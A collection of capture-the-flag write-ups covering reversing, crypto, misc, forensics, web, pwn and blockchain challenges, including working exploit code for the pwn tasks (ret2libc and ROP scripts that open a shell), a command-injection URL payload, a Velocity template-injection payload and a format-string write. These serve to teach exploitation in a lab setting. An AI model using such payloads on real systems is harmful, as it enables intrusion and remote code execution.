# Reversing

## BoxCutter

Debug with `gdb` and build the flag from the results of operations.

## LootStash

Run `strings` and look for the flag.

## PackedAway

Run file, see that it is packed with UPX. Unpack with upx (`upx -d`), run strings and get the flag.

## Crushing

Reverse the encryption cipher.

It outputs in the following format: 
	First a count for the number of occurences of the character (the index in the file where the count is located dictates the character, as it saves the index at `charCode * 8`, and if that's occupied, it saves the new index in the next position, and so on for each character), then, a list of all the indices for that character.

Make sure to only count indices from the file only when not iterating through a list of indices for a character.

```Python
		elems = []
		lens = 0
		with open("message.txt.cz", "rb") as f:
		  offset = 0
		  while True:
		    running = False
		    data = f.read(8)
		    if not data:
		      break
		    data = int.from_bytes(data, "little")
		    if data != 0x0:
		      running = True
		    else:
		      offset += 8
		      continue
		    if running:
		      idxs = []
		      goodOff = offset
		      offset += 8
		      for i in range(data):
		        data = int.from_bytes(f.read(8), "little")
		        idxs.append(data)
		      elems.append({"charCode": goodOff // 8, "idx": idxs})
		      lens += len(idxs)
		res = [0] * lens
		for k in elems:
		  for elem in k["idx"]:
		    res[elem] = chr(k["charCode"])
		print(''.join(res))
```
## Follow The Path

Sidenote: pretty freakin cool challenge.

It is windows `PE` (`EXE` file). Looking at it statically doesn't yield much, just that for checking the flag it does some weird `XOR` stuff on itself.

Let's try debugging it. When debugged, we can see a self-decryption process happening. 

Just step through it manually at first, going into each call whilst remaining in the same module (don't go looking into `kernel32.dll` or others), until we reach the checking of the input.

There, we can see that it dynamically decrypts its own execution. It checks char by char from the inputted flag, and if the char matches (check done by `XOR` against a known value), then it goes on to `XOR` decrypt the next check, and so on until the end.

You can kinda automate the process by getting the memory from `windbg` (or w/e debugger you use), getting the `XOR` key and decrypt it, put it in `CFF Explorer` (or w/e disassembler you like) and get the next stage, rinse and repeat from there. Or, just put some dummy value when the program asks and debug it, modifying the registries to pass the checks and move on to the next stage.

## QuickScan

First, start by analyzing some of the ELFs sent and look for some patterns.

First it does `sub rsp, 0x18` (or amount of bytes that'll be written to the stack).
Secondly, it loads in `rsi` the address from where the data is obtained via `lea` (decode the op `48`-64 bit part, don't bother with it; `8d`-lea opcode; `35` - rsi; rest 4 bytes are the `relative offset` (signed) = difference between the beginning of the string section and the current instruction).

Put that in code and build the address from those two operations at the beginning of entrypoint, and then read the amount of bytes from there.

```Python
		from pwn import *
		import base64
		p = remote("94.237.56.188", 53596)
		rec = str(p.recv(8192))
		print(rec)
		bytez = rec.split("Expected bytes: ")[1].split("\\n")[0].strip()
		p.sendline(bytez.encode())
		while True:
			rec = str(p.recv(8192))
			print(rec)
			b64 = rec.split("ELF: ")[1].split("\\n")[0].strip()
			b64 = bytes(b64, "utf-8")
			with open("dll.elf", "wb") as f:
				f.write(base64.decodebytes(b64))
			e = ELF("dll.elf")
			no = e.read(e.entrypoint, 4)[3]
			addr = e.read(e.entrypoint + 7, 4)
			addr = int.from_bytes(addr, "little")
			if addr > 0x80000000:
				addr = 0xffffffff - addr - 0xa
				data = e.read(e.entrypoint - addr, no)
			else:
				data = e.read(e.entrypoint + addr + 0xb, no)
			p.sendline(data.hex().encode())
			print(data.hex())
```

## Metagaming

Sidenote: pretty insane challenge.

It tries to imitates a regular computer, with instructions and registers. Instructions do operations on registers, and some operations are based on the values of the flag.
The goal is to obtain a flag that'll get the required values in the registers.

One solution:

Create a `Python` script that'll output all the comands with the values replaced, in the same order as in the program.
Go look at individual registers, from end to start (wise-choice, trust me).
Registers 14-10 need little interventions to fix their values, the ones from 0-9 are "problematic".
Start from 9, look at the operations it does (really nice to have them in order), and build a `C++` program (pay attention to the types used - use `uint32_t` for your var used in calculations) that'll iterate over the alphabet provided and do all the required operations for that register and search for a combination of letters that'll create the required value.
From there, move to lower registers, paying attention to how the last `XOR` value changes between uses (and the order of operations).
Slowly build the flag.


# Crypto

## Dynastic
Just reverse the operation, it's a simple one, just changes + with - in the mappings.

```Python
		def to_identity_map(a):
		    return ord(a) - 0x41
		def from_identity_map(a):
		    return chr(a % 26 + 0x41)
		enc = "DJF_CTA_SWYH_NPDKK_MBZ_QPHTIGPMZY_KRZSQE?!_ZL_CN_PGLIMCU_YU_KJODME_RYGZXL"
		def decrypt(ciphertext):
		    m = ''
		    for i in range(len(ciphertext)):
		        ch = ciphertext[i]
		        if not ch.isalpha():
		            m += ch
		        else:
		            chi = to_identity_map(ch)
		            m += from_identity_map(chi - i)
		    return m
		print(decrypt(enc))
```

## Makeshift

Another simple operation, just reverse it.

```Python
			for i in range(len(enc) - 1, 0, -3):
				dec += enc[i - 1]
				dec += enc[i - 2]
				dec += enc[i]
```

## Primary Knowledge

Test our modulus for known attack, using either `RsaCtfTool` or maybe `dcode.fr`. 
They'll both print out that `n` is prime.

Since N is already prime, we can calculate `d` (decryption exponent) as `e ^ (-1) % (n - 1)` (modular inverse).
This is possible since `d` is the modular multiplicative inverse of `e` module `lambda(n)`, where `lambda(n) = lcm(lambda(p), lambda(q)) = lambda(p) * lambda(q) = phi(q) * phi(p), (p, q - primes) => lambda(n) = (p - 1) * (q - 1)`, but since `n` is already prime, `lambda(n) = phi(n) = n - 1`.

Calculate `d` and decrypt the text.

## Iced Tea

You can reverse the algorithm there (`https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm`), but `ChatGPT` does it faster ^.^.

```Python
		def decrypt(self, ct):
	        blocks = [ct[i:i+self.BLOCK_SIZE//8] for i in range(0, len(ct), self.BLOCK_SIZE//8)]

	        pt = b''
	        if self.mode == Mode.ECB:
	            for ct_block in blocks:
	                pt += self.decrypt_block(ct_block)
	        elif self.mode == Mode.CBC:
	            X = self.IV
	            for ct_block in blocks:
	                dec_block = self._xor(X, self.decrypt_block(ct_block))
	                pt += dec_block
	                X = ct_block
	        return unpad(pt, self.BLOCK_SIZE//8)

	    def decrypt_block(self, ct_block):
	        m = b2l(ct_block)

	        msk = (1 << (self.BLOCK_SIZE // 2)) - 1

	        m1 = m & msk
	        m0 = (m >> (self.BLOCK_SIZE // 2)) & msk

	        K = self.KEY
	        s = (self.DELTA << 5) & msk

	        for i in range(31, -1, -1):
	            m1 -= ((m0 << 4) + K[2]) ^ (m0 + s) ^ ((m0 >> 5) + K[3])
	            m1 &= msk
	            m0 -= ((m1 << 4) + K[0]) ^ (m1 + s) ^ ((m1 >> 5) + K[1])
	            m0 &= msk
	            s -= self.DELTA

	        pt = l2b((m0 << (self.BLOCK_SIZE // 2)) + m1)
	        return pt
```

## Blunt

It appears to be a simple `DH` implementation, based on the `Discrete Logarithm Problem`.

Personally, I've tried bruteforce and then `Baby-Steps-Giant-Steps` algorithm, but sadly none worked. Then, I stumbled upon `https://www.alpertron.com.ar/DILOG.HTM` to obtain the keys and it decrypted just fine after finding them instantly lmao.


# Misc

## Character

You can manually get the flag then do some `Sublime`/`Notepad` (or w/e text editor you use) trickery to get it, or just automate it via a script.

## Stop Drop and Roll

You just have to play the game, nothing more. It requires around 500 entries, so good luck if you're doing it manually.

```Python
		import subprocess
		import pwn
		io = pwn.remote("94.237.49.138", 36269)
		print(io.recvline())
		print(io.recvline())
		print(io.recvline())
		print(io.recvline())
		print(io.recvline())
		print(io.recvline())
		print(io.recvline())
		print(io.recvline())
		print(io.recvline())
		print(io.recvline())
		print(io.recvline())
		print(io.recvline())
		io.sendline(b"y")
		print(io.recvline())
		mapp = {"GORGE":"STOP", "PHREAK":"DROP", "FIRE":"ROLL"}
		while True:
			res = io.recvline().decode().strip()
			print(res)
			spl = res.split("?")
			spl = spl[1 if len(spl) == 2 else 0].split(",")
			spl = [s.strip() for s in spl]
			chl = ""
			for s in spl:
				chl += mapp[s]
				chl += "-"
			chl = chl[:-1]
			io.sendline(chl.encode())
```

## Unbreakable

A simple analysis of the code reveals that it does `eval` on the code, having some blacklisted words in place.

A simple answer for this is `print(open('flag.txt').read())`.

## Cubicle Riddle

Analysis of the code indicates that it requires you to create the missing bytecode for a function that returns the `min` and `max` of a list.

We can use the `dis` module in python to obtain bytecode. Ideally, we should analyze the start and end bytecodes that we're provided, since they'll dictate how the function will look.

Also, a good idea is to respect var/const names provided.

```Python
			>>> def test(num_list):
			...     min = 1000
			...     max = -1000
			...     if num_list is None:
			...             return (min, max)
			...     for num in num_list:
			...             if num > max:
			...                     max = num
			...             if num < min:
			...                     min = num
			...     return (min, max)
			...
			>>> test.__code__.co_varnames
			('num_list', 'min', 'max', 'num')
			>>> test.__code__.co_consts
			(None, 1000, -1000)
			>>> test.__code__.co_code
			b'\x97\x00d\x01}\x01d\x02}\x02|\x00\x80\x04|\x01|\x02f\x02S\x00|\x00D\x00]\x12}\x03|\x03|\x02k\x04\x00\x00\x00\x00r\x02|\x03}\x02|\x03|\x01k\x00\x00\x00\x00\x00r\x02|\x03}\x01\x8c\x13|\x01|\x02f\x02S\x00'
```

## Path of Survival

Seems to be a pathfinding game. Can be manually done, but requires lot of time and thinking, since you'll most likely have to find the minimum cost path.

One such algorithm that does just that is `Dijkstra`. Modify it to respect the rules of the game, and let it rip.

```Python
		import requests
		from queue import PriorityQueue

		BASE_URL = "http://94.237.57.88:50383"

		def get_map():
			response = requests.post(f"{BASE_URL}/map")
			print("Got map")
			return response.json()

		def update_direction(direction):
			data = {"direction": direction}
			response = requests.post(f"{BASE_URL}/update", json=data)
			print("Updated direction = " + direction)
			return response.json()

		def dijkstra(start, target, terrain_matrix, height, width, max_cost):
			pq = PriorityQueue()
			pq.put((0, start, []))
			distance = {start: (0, [])}
			while not pq.empty():
				current_cost, current_position, current_path = pq.get()
				if current_position == target:
					return distance[target][1]

				moves = [(-1, 0), (1, 0), (0, -1), (0, 1)]
				for move in moves:
					new_position = (current_position[0] + move[0], current_position[1] + move[1])
					if 0 <= new_position[0] < height and 0 <= new_position[1] < width:
						if terrain_matrix[new_position[0]][new_position[1]] == "E":
							continue
						elif terrain_matrix[new_position[0]][new_position[1]] == "C":
							if not ((current_position[0] + 1 == new_position[0] and current_position[1] == new_position[1]) or (current_position[0] == new_position[0] and current_position[1] + 1 == new_position[1])):
								continue
						elif terrain_matrix[new_position[0]][new_position[1]] == "G":
							if not ((current_position[0] - 1 == new_position[0] and current_position[1] == new_position[1]) or (current_position[0] == new_position[0] and current_position[1] - 1 == new_position[1])):
								continue
						new_cost = current_cost + calculate_cost(terrain_matrix[current_position[0]][current_position[1]], terrain_matrix[new_position[0]][new_position[1]])
						if new_position not in distance or new_cost < distance[new_position][0]:
							if new_cost <= max_cost:
								new_path = current_path + [new_position]
								distance[new_position] = (new_cost, new_path)
								pq.put((new_cost, new_position, new_path))
							else:
								continue
			return []

		def calculate_cost(terrain_from, terrain_to):
			costs = {
			('P', 'M'): 5, ('M', 'P'): 2,
			('P', 'S'): 2, ('S', 'P'): 2,
			('P', 'R'): 5, ('R', 'P'): 5,
			('M', 'S'): 5, ('S', 'M'): 7,
			('M', 'R'): 8, ('R', 'M'): 10,
			('S', 'R'): 8, ('R', 'S'): 6
			}
			if terrain_from == terrain_to:
				return 1
			elif terrain_from in ["C", "G"] or terrain_to in ["C", "G"]:
				return 1
			elif (terrain_from, terrain_to) in costs:
				return costs[(terrain_from, terrain_to)]
			else:
				return float('inf')

		def solve_map():
			solves = 0

			while True:
				current_map = get_map()
				height = current_map["height"]
				width = current_map["width"]
				player_position = (current_map["player"]["position"][1], current_map["player"]["position"][0])
				print("starting position == " + str(player_position))
				terrain_matrix = [[current_map["tiles"]["(" + str(j) + ", " + str(i) + ")"]["terrain"] for j in range(width)] for i in range(height)]
				max_cost = current_map["player"]["time"]
				weapon_positions = [(i, j) for i in range(height) for j in range(width) if current_map["tiles"]["(" + str(j) + ", " + str(i) + ")"].get("has_weapon")]
				print("weapon positions")
				print(weapon_positions)
				path = "nada"
				for pos in weapon_positions:
					p = dijkstra(player_position, pos, terrain_matrix, height, width, max_cost)
					if p != []:
						path = [x for x in p]
						break
				print("target position = " + str(path[-1]))
				print(path)
				if type(path) == type([]):
					for next_position in path:
						direction = get_direction(player_position, next_position)
						player_position = next_position
						update_response = update_direction(direction)
					if "solved" in update_response:
						solves += 1
						print(f"Solved map {solves}!")
					if "flag" in update_response:
						print(update_response["flag"])
						break
					print(f"Arrived at the target position {path[-1]}")
				else:
					print(f"Path cost exceeds the maximum cost. Skipping map.")
					break

		def get_direction(current_position, target_position):
			if current_position[0] < target_position[0]:
				return "D"
			elif current_position[0] > target_position[0]:
				return "U"
			elif current_position[1] < target_position[1]:
				return "R"
			elif current_position[1] > target_position[1]:
				return "L"
			else:
				return "U"

		if __name__ == "__main__":
			solve_map()
```

## MultiDilingual

This challenge requires us to write polyglot program (program that'll run in multiple languages as-is, meaning the same source code compiled for `C` or interpreted for `Python`, it just works).

Looking through the web, we can find `https://github.com/floyd-fuh/C-CPP-Perl-Ruby-Python-Polyglot/blob/master/url_interaction/code.c`, which was taken as a template, modified it to my needs and added `PHP8` support.

```C/C++/Ruby/Python/PHP8/Perl
		#define a "cat flag.txt"
		#include/*
		q="""*/<stdlib.h>
		int main(){if(sizeof('C') - 1) system(a);
		    else   {system(a);}} /*=;
		print `cat flag.txt`;#";system('cat flag.txt')#""";exec('import os\nos.system("cat flag.txt")')#<?php echo file_get_contents('flag.txt');?>*/
```
### Some notes for pickles

kinda close but not there: https://ctftime.org/writeup/16722
interesting stuff about python and some pyjail useful stuff https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/

# Forensic

## It Has begun

Looking through the files, we can see that the first part of flag is at the end of the `RSA` key(needs reversing).
Second part of the flag is in the last command, encoded as `Base64`.

## An unusual sighting

Just connect to the given ip via `nc` and answer its questions.

## Urgent

It presents as an `EML` file (email). It can be opened with a text editors, and reveals informations about the sender, receiver, the message and its attachment.

Decode the second attachment (`Base64`), and decode the resulting `JS`, and you'll obtain the flag.

## Fake Boost

After looking through the files, would be to filter for `HTTP` requests. There, we see an interesting request to `/freediscordnitro`. Get the response to that request.

You'll get an obfuscated `PS1` script, which is a loader. We can analyze it, but we're more interested in what it is building, so try to decode it and see what it builds for the next stage.

The first part of the flag will be in the `$part1` variable of the second stage.

The second part of the flag is obtained by decrypting the data sent by the attackers via a `POST` request to the `/rj1893...` endpoint. You have the `AES` algorithm in code (normal `AES`), we also have the key, and the `IV` is saved in the first 16 bytes of the encrypted data (from the source code) => usage of `AES-CBC-256`. After decrypting that data, base64 decode the email field, and there'll be the rest of the flag.

## Pursue the tracks

Use Eric Zimmerman's `MFTExplorer` and answer the questions (connect via `nc`).

## Phreaky

Analzying the `PCAP`, we can see some `SMTP` requests, which strike our interest.

Get the archives from all emails, and save their output. Then, combine all of those outputs in a `PDF` file as instructed in the emails (by copy pasting each one into a hex editor such as `HxD` / create a script that'll read all PDF and combine them). The flag is in the PDF.

## Data Siege

Looking first at it, some `HTTP` requests strike our interest.

We see first a script that downloads an `EXE`.

Afterwards, we get the request for that `EXE`, save it locally.

Analyze that `EXE`. It is a `.NET` binary (use `dnspy` for decompilation), which hints at being `ezRAT`. Look at the decryption process and replicate it (1-1, can be done locally in `C#` - easiest method), and decrypt the communication between the attacker and victim (attacker IP and stuff for decryption are all in the binary).

## Game Invitation

It is a `.docm` file (word document with `VBA` macros).

We can use `oletools` by Didier Stevens to analyze the file, especially `olevba` which will allow us to to get the `VBA` script.

Analyze the macro. It builds a `JS`, then runs it. Build the `JS` from the `.docm` file just the way it is done in the macro.

Carefully nerf the `JS` (replace `eval` with `console.log` for example), and then run `Chrome`, go to `about:blank` and paste the code in the console (devtools), so we can try it. Alternatively, you can use `wscript`/`cscript` to run it.

It'll produce a new `JS`, which seems obfuscated. Deobfuscate it via sites like `deobfuscate.io`, and analyze it.

There'll be a `SetRequestHeader` call somewhere with a `Cookie` set to some `Base64`, decode that string and you'll get the flag.


# Hardware

## Maze

Look through the `PDF`, and you'll find the flag.

## BunnyPass

Challenge states that default  `RabbitMQ` creds (guest:guest) work, use those.

Then, look through stuff in there, and search for the flag. It'll be in queue messages for factory_idle.

# Web

## Flag Command

Open the website in a web browser.

By analyzing source `JS` files, you can see what are the first 2-3 options you need to advance in the game.

After that, there'll be a request sent to `/api/options`, which will reveal a secret command.

Enter that command and get the flag.


## Timekorp


Analyzing the files, we can notice a call to `exec` that's done on the format parameter of the URL, meaning that we can achieve command execution by injection that parameter.

Do a simple test string to cat out the flag and you'll get it: `format=%27;cat%20/flag;echo%20%27a`.

## Korp terminal

Opening the page, seems like a simple terminal, with not much to gather from the source.

Try bruteforcing it (with `wfuzz` or w/e else you want) with username admin and password taken from `rockyou`, just as a test. This seems to work and yields the correct password.

## Labyrinth Linguist

Upon loading the page, we can see a simple page. In the textbox, whatever we input gets injected directly into the page => vulnerable to `XSS`.

However, a simple `XSS` won't allow us to read files from the server.

Furthermore, analyzing source files, it reveals that the flag name is randomized in the `/` directory.

Analyzing the source files, it is also revealed that the backend is a `Java` server, that uses `Velocity` as a template engine.

Since we couldn't do much with that `XSS`, we'll attempt to upgrade our found vulnerability to `SSTI` (Server-Side Template Injection).

Researching this, you'll see that `Velocity` has its own template language, and researching further for `VTL` polyglots/`SSTI` payloads, we stumbled upon this one, which actually works: `https://iwconnect.com/apache-velocity-server-side-template-injection/`.

Use that payload, modify the command to `ls /` first, then `cat` the flag. 

```VTL
			#set($s="")
			#set($stringClass=$s.getClass())
			#set($stringBuilderClass=$stringClass.forName("java.lang.StringBuilder"))
			#set($inputStreamClass=$stringClass.forName("java.io.InputStream"))
			#set($readerClass=$stringClass.forName("java.io.Reader"))
			#set($inputStreamReaderClass=$stringClass.forName("java.io.InputStreamReader"))
			#set($bufferedReaderClass=$stringClass.forName("java.io.BufferedReader"))
			#set($collectorsClass=$stringClass.forName("java.util.stream.Collectors"))
			#set($systemClass=$stringClass.forName("java.lang.System"))
			#set($stringBuilderConstructor=$stringBuilderClass.getConstructor())
			#set($inputStreamReaderConstructor=$inputStreamReaderClass.getConstructor($inputStreamClass))
			#set($bufferedReaderConstructor=$bufferedReaderClass.getConstructor($readerClass))
			#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
			#set($process=$runtime.exec("whoami"))
			#set($null=$process.waitFor() )
			#set($inputStream=$process.getInputStream())
			#set($inputStreamReader=$inputStreamReaderConstructor.newInstance($inputStream))
			#set($bufferedReader=$bufferedReaderConstructor.newInstance($inputStreamReader))
			#set($stringBuilder=$stringBuilderConstructor.newInstance())
			#set($output=$bufferedReader.lines().collect($collectorsClass.joining($systemClass.lineSeparator())))
			$output
```

# Pwn

## Tutorial

Just `nc` to that address and answer it's questions.

## Pet Companion


Analyzing the source code (`Ghidra`/`IDA`), we can see that there might be a potential buffer overflow, since `read()` can read past the allocated buffer easily.
Test that hypotesis in `GDB`. It'll work. Then check how much we need to write in order to get to `RIP`. In this case, it'll be 72 characters. (You can also use `msf-pattern-create` or `GDB-PEDA`'s `pattern`) 

Now that we have a working exploit, let's look through the file to see what we need to do with it. Looking through it, not much is revealed, as there's no function we should call or get the flag somehow. Thus, our last avenue of obtaining the flag would be to obtain a shell, which would require a ret2libc attack, since we need to call `system("/bin/sh")` to get a shell.

To initiate that attack, we first have to find some way to leak `libc` addresses.

Since our program uses `write`, `read`, we can use write to print out whatever function address we want. We'll use `read` in this example.

For this, we'll have to craft a payload that'll first overwrite the stack (including `RBP` => 72 characters). Then, we need to prepare the arguments for the `write` call. Looking in `GDB` at how the write call is performed in our program, we can determine that `RSI` contains the buffer to be printer out, `EDI` is the file descriptor to which it writes, and `EDX` is the length which it'll print (this can be done also by analysis in `Ghidra`). Now, we have to find a way to put the address of `read` into `RSI`, and modify `EDX` (`EDI` remains 1 until the end of the program, thus needs no modification). We'll use `ROPGadget` for that one, as it prints out gadgets (possible useful instructions for binary exploitations that are immediately followed by `ret`). Looking through it's output, we see that there's a `POP RSI; POP R12; RET` gadget, but unfortunately, no `POP EDX; RET`, so we'll resort to having `EDX` set to what it was when the program ended. Since our `RSI` gadget also has a `POP R12` instruction, make sure to add a filler after the require address for `RSI`, such that our exploit chain doesn't break due to another `POP`. 
Now, for building the first part of the exploit, after the overflow we'll put our `POP RSI` gadget's address, with the address for `read` from GOT (address from `Ghidra` in .got section or from debugging) and the filler (can be any value), then we'll put the address of `write`, obtainined from the `PLT` (either from `Ghidra` in .plt section, or can be obtained via debugging), and last, we'll put an address from `main`, as we'd want to return there and continue our exploitation.

Now that we have a primitive for leaking the actual `libc` address of `read`, let's now load the provided `libc`, and calculate the base of it, by subtracting `read`'s offset from our leaked address. 

With the newly calculate `libc` base, we can calculate the actual runtime address of `system`, and the `/bin/sh` string, by using the offsets from the provided `libc`.

Let's build our second payload now.
We'll do the same overwriting, but for this we'll have to make `RBP` be NULL (0), so look for a gadget for `POP RBP; RET` and insert it after the overwrite, having the value `0x0` afterwards. (zombienator pwn challenge from unictf - 2023 - much love for this tip) (other good reference for this attack is `https://corruptedprotocol.medium.com/h-cktivitycon-2021-ctf-the-library-ret2libc-aslr-bypass-a83a8207f237`).

Now, lastly, we'll have to get a gadget for `POP RDI`, as in `RDI` will be the argument for `system`. Put in `RDI` the address of `/bin/sh`, and then have the address of system, and voila.

```Python
		from pwn import *
		overwrite = b"A"*72
		poprsi = p64(0x0000000000400741)
		read_at_got = p64(0x00600fe0)
		write_at_plt = p64(0x004004f0)
		safe_point_main = p64(0x0040064a)
		filler = p64(0x0)
		payload = overwrite + poprsi + read_at_got + filler + write_at_plt + safe_point_main
		#p = process("./pet_companion")
		p = remote("94.237.62.237", 48108)
		p.recvuntil("[!] Set your pet companion's current status: ")
		p.sendline(payload)
		p.recvline()
		p.recvline()
		p.recvline()
		leak = u64(p.recvline()[:6] + b"\x00\x00")
		p.recvuntil("[!] Set your pet companion's current status: ")
		print(f"Leaked libc address for read: {hex(leak)}")
		libc = ELF("./glibc/libc.so.6")
		libc_base = leak - libc.sym["read"]
		print(f"Calculated libc base: {hex(libc_base)}")
		system = p64(libc_base + libc.sym["system"])
		bin_sh = p64(libc_base + next(libc.search(b"/bin/sh\x00")))
		poprdi = p64(0x0000000000400743)
		poprbp = p64(0x0000000000400588)
		payload2 = overwrite + poprbp + filler + poprdi + bin_sh + system
		p.sendline(payload2)
		p.recv()
		import time
		time.sleep(5)
		p.interactive()
```

## Delulu

Looking through the binary, we can see that it sets a value to `0x1337babe`, and later checks for it to be `0x1337beef` (without any modifications happening on that variable). If it somehow changes, then it calls a function that prints out the flag.

Analzying the binary more, we can see that it outputs our input buffer without any format specifiers => format string vulnerability.

First, let's start by leaking some addresses via `%p`, to see which offset of the leaked addresseswe'll want to exploit. By analyzing in the same time with `GDB`, we can see that the 7-th offset is the address of our control value.

Enter `%n`. `%n` will write to an address the amount of characters that were printed previously. Now, we have our primitive for writing to that address, by using `%7$n` to specify that it should write for the 7-th offset. However, it'll be impossible to write `0x1337beef` chracters (decimal=322420463).

Trick: https://www.youtube.com/watch?v=t1LH9D5cuK4 at around 7:36

We can pad our input by using %OFFSET$AMOUNT_OF_CHARS_TO_PADx%7$n, which will trigger the write of `AMOUNT_OF_CHARS_TO_PAD` to the address in the offset `OFFSET`.

Thus, our final input will be `%7$322420463x%7$n`.


## Writing on the wall

Analyzing the binary, a little bit of a buffer overflow pops out, namely that it reads 7 bytes into a buffer of 6.

We can see that it has a control value (the actual value is not really important), which will be used in a `strcmp` against our input.
Since our buffer is 6 bytes, and the control value is 8 bytes, there is not really any chance to find a valid input that'll match those 2.

Analyzing via `GDB`, we can get a hint to what we need to do.
Our control value will be located at `RBP - 0x10`, whereas the input will be at `RBP - 0x16`. Stepping further, we can see that when the call to `strcmp` is prepared, the control value gets concatenated with our string. This points to the actual problem, as there's no automatic append of `0x00` (string terminator). 
We can also notice that our input buffer overflows into the control value with 1 byte.

So, to make this `strmcp` pass, we'd have to nullify both strings, such that the `strcmp` call would result in it comparing two empty strings, which are equal.

To get the flag, use `pwntools` to send an input of 7 `0x00` bytes.


Some sidenote: `read` terminates on `\n`, `gets`/`strcmp` terminate on `0x00`

## Rocket Blaster xxx

Analyzing the binary in `Ghidra`, we can see a possible overflow, as the `read` overflows the input buffer.
Looking further, we can also see a function called `fill_ammo`, which sounds interesting. Decompiling it reveals that it is our winner function, as it'll print out the flag, if the conditions are met. Conditions required are that the 3 parameters it takes be equal to some specific values. Looking at the disassembly in `Ghidra`, we can see that the parameters (in order) are stored in the following registers (in the same order): `RDI`, `RSI` and `RDX`.

Thus, to exploit this, we need to use ROP (Return-Oriented-Programming), such that after the overwrite, our program will jump to some gadgets which will modify the registers accordingly, then jump to the winner function. Use `ROPGadget` to find gadgets for `POP RDI; RET`, `POP RSI; RET` and `POP RDX; RET`.

Now that we have those gadgets, we can start figuring out the exploit. We'll first have to identify the number of bytes needed until we overwrite `RIP`. In this case, it is 40. Then, we'll put, in this order, our `POP RDI` gadget, followed by the value we need into `RDI` (first param), then `POP RSI`, followed by its value (second param), then `POP RDX`, followed by its value (third param), and lastly, we'd want to call the `fill_ammo` function, so put its address there (obtained either from `Ghidra` or `GDB`).

Trying this exploit will fail on a `MOVAPS` instruction somewhere in calls to `printf`. `MOVAPS` refers to moving aligned pointers, and it tries to move something indexed from `RSP`, thus, the current exploit chain de-aligned our stack and made it fail. (reference: `https://stackoverflow.com/questions/38335212/calling-printf-in-x86-64-using-gnu-assembler` - "It requires that just before a CALL that the stack be at least 16-byte (or 32-byte) aligned.")
Stack aligned means that `RSP % 16 == 0`.
To fix this, find a simple `RET` instruction with `ROPGadget`, and place it right after the overwrite.

This should fix the alignment, and make the exploit work.

```Python
		from pwn import *
		overwrite = b"\x00" * 40
		align = p64(0x000000000040101a)
		poprdi = p64(0x000000000040159f)
		value_rdi = p64(0xdeadbeef)
		poprsi = p64(0x000000000040159d)
		value_rsi = p64(0xdeadbabe)
		poprdx = p64(0x000000000040159b)
		value_rdx = p64(0xdead1337)
		win_func = p64(0x004012f5)
		payload = overwrite + align + poprdi + value_rdi + poprsi + value_rsi + poprdx + value_rdx + win_func
		#p = process("./rocket_blaster_xxx")
		p = remote("94.237.55.185", 46277)
		print(p.recv())
		p.sendline(payload)
		p.interactive()
```

### some notes for sound of silence, maybe (as there was no csu to use, but I think we had to overwrite GOT somehow), but interesting nonetheless 

kinda close `https://ctftime.org/writeup/38340`
ret2csu `https://ir0nstone.gitbook.io/notes/types/stack/ret2csu`
one_gadget `https://github.com/david942j/one_gadget`

could as well be a ret2dlresolve attack lmao `https://github.com/ir0nstone/pwn-notes/blob/master/types/stack/ret2dlresolve/README.md`
good pwn resources `https://github.com/ir0nstone/pwn-notes/tree/master/types/stack`

# Blockchain

## Russian Roulette

First of all, looking through the files, we see `.sol` files, which are related to `Solidity` contracts. We'll need to install some software to be able to compile those. I went with the use of `Remix IDE` for this one.

Analzying the source code, we see that the condition for this challenge to be solved it needs the balance to be 0. For the balance to be emptied, the condition in the `pullTrigger` function needs to happen.

For us to be able to interact with that contract, we need some things. Connect to the `nc` instance to get connection information, such as the private key and the address of the target contract. Then, use Remix IDE to compile the `RussianRoulette` contract, so we can obtain its `ABI` (Application-Binary-Interface = allows an app to see how to interact with this specific contract).

For interacting with this, I've chosen to use `ethers` (Node.JS). Choose `ethers` version 5.0.7, otherwise you'll get an error, since from that version and up they don't JSONify the responses.

Now, the other port is for the `RPC` (Remote-Procedure-Call). That is what we'll use to interact with our contract.

Basically, we need to call `pullTrigger`, then check the balance of the contract. We do this until the balance reaches 0.
After it reaches 0, connect to the `nc` instance and get the flag.

```Javascript
		const { ethers } = require('ethers');
		const PRIVATE_KEY = "0x537916f4f852b0967d676f468dcb1d24bffce762cdd803b92575e02780ccf470";
		const RUSSIAN_ROULETTE_ADDRESS = "0xd432C143DD770852db4544753936f8712515e5ab";
		const RUSSIAN_ROULETTE_ABI = [
		    {
		        "inputs": [],
		        "stateMutability": "payable",
		        "type": "constructor"
		    },
		    {
		        "inputs": [],
		        "name": "pullTrigger",
		        "outputs": [
		            {
		                "internalType": "string",
		                "name": "",
		                "type": "string"
		            }
		        ],
		        "stateMutability": "nonpayable",
		        "type": "function"
		    }
		];
		const provider = new ethers.providers.JsonRpcProvider("http://94.237.54.164:31826");
		const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
		const russianRouletteContract = new ethers.Contract(RUSSIAN_ROULETTE_ADDRESS, RUSSIAN_ROULETTE_ABI, wallet);
		async function pullTrigger() {
		    console.log("Attempting to pull the trigger...");
		    try {
		        const tx = await russianRouletteContract.pullTrigger();	        
		        await tx.wait();
		        console.log("Transaction mined: ", tx.hash);
		    } catch (error) {
		        console.error("Error pulling the trigger: ", error);
		    }
		}
		async function checkBalance() {
		    const balance = await provider.getBalance("0xd432C143DD770852db4544753936f8712515e5ab");
		    console.log(`Current balance: ${ethers.utils.formatEther(balance)} ETH`);
		    return ethers.utils.formatEther(balance);
		}
		async function main() {
		    await pullTrigger();
		    var bal = await checkBalance();
			while (bal == 10) {
				await pullTrigger();
				bal = await checkBalance();
			}
		}
		main();
```

## Lucky Faucet

This challenge is based on the same principles as the one above. We need to interact with the target contract, until the condition in `isSolved` is met.

We can modify the script above to include the new `RPC` URL, along with the modified `ABI` and interaction. For this, it needs to lose more than 10 `eth` from what it had at the beginning (500).

You can either modify the bounds or leave them as they are (it'll probably go faster if you modify them though).

## Recovery

For this challenge, we're provided 3 ports. One will be the `nc` instance we'll need to connect to get the flag once the condition is satisfied, one is the `ssh` instance we'll need to connect to, and one we don't care for now.

Going into that `ssh` machine, we can see a folder named `wallet`, with a file named `electrum-wallet-seed.txt`. Researching this, that seed is a mnemonic used to establish private keys for an electrum wallet.

Let's install electrum and try to recover the wallet.
After that is done, let's connect to the `nc` version just as a check, to see what's there.

We're greeted with a message and the condition for solving the challenge, which is, to send all the bitcoins back to the provided address.

